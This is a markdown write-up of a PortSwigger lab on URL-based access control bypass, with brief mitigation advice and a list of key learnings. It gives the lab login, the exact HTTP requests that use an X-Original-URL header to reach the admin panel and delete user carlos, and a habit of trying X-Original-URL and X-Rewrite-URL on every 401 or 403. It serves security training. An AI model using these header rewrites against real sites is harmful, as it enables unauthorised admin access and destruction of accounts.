# Lab05 - URL-Based Access Control Bypass

## Objective

Delete the user:

```text
carlos
```

by bypassing URL-based access controls.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Vertical Privilege Escalation |
| Difficulty | Practitioner |
| Platform | PortSwigger |

---

# Vulnerability Overview

The front-end application blocks access to admin functionality.

However, the back-end application trusts:

```http
X-Original-URL
```

header.

This allows attackers to rewrite the target URL.

---

# Analysis

## Step 1

Login as:

```text
wiener:peter
```

---

## Step 2

Attempt to access:

```text
/admin
```

---

Response:

```http
401 Unauthorized
```

or

```http
403 Forbidden
```

---

## Step 3

Send request to:

```http
GET /
```

---

Add Header:

```http
X-Original-URL: /admin
```

---

Result:

```text
Admin Panel Accessible
```

---

## Step 4

Locate delete functionality.

---

## Step 5

Send:

```http
GET /?username=carlos
X-Original-URL: /admin/delete
```

---

Result:

```text
Carlos Deleted
```

Lab solved.

---

# Full Payload Used

## Request 1

```http
GET /
X-Original-URL: /admin
```

---

## Request 2

```http
GET /?username=carlos
X-Original-URL: /admin/delete
```

---

# Why It Works

Architecture:

```text
Browser
        ↓
Front-End
        ↓
Back-End
```

---

Front-End Checks:

```text
/
```

---

Back-End Processes:

```text
/admin
```

via:

```http
X-Original-URL
```

---

Execution Flow

```text
Header Manipulation
        ↓
Backend Sees Admin URL
        ↓
Authorization Bypassed
```

---

# Personal Analysis & Testing Process

## Initial Observation

Direct access denied.

---

## Key Thought

Many reverse proxies trust:

```http
X-Original-URL
```

---

## Test

Added:

```http
X-Original-URL: /admin
```

---

## Result

Admin functionality exposed.

Lab solved.

---

# Mental Model

Whenever:

```text
403
401
Forbidden
```

try:

```http
X-Original-URL
X-Rewrite-URL
```

before giving up.

---

# Mitigation

Do not trust:

```http
X-Original-URL
```

for security decisions.

Apply authorization checks at the application layer.

---

# Related Theory

- 06-vertical-privilege-escalation.md
- 10-platform-misconfiguration-bypasses.md

---

# Key Learnings

- Reverse proxy misconfigurations are dangerous.
- Header rewriting can bypass authorization.
- Authorization must be enforced consistently.